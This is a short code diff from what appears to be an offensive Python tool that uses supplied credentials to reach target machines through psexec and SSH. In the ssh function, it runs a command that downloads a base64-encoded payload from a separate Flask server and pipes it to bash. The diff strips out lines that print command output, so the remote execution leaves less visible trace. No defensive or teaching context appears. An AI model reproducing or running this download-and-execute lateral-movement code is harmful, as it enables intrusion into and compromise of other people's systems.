@@ -45,7 +45,6 @@ def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
     p.send(cmd.encode())
     p.send(b'\4')
     print(p.readuntil("Checking"))
-    p.readall()
 
 def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
     client = paramiko.SSHClient()
@@ -59,8 +58,6 @@ def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
         # Run a command
         command = f"curl http://{FLASK_HOST}:{FLASK_PORT}/static/lin | base64 -d | bash"
         stdin, stdout, stderr = client.exec_command(command)
-        print("Command Output:")
-        print(stdout.read().decode())  # Print command output
 
         # Close the connection
         client.close()
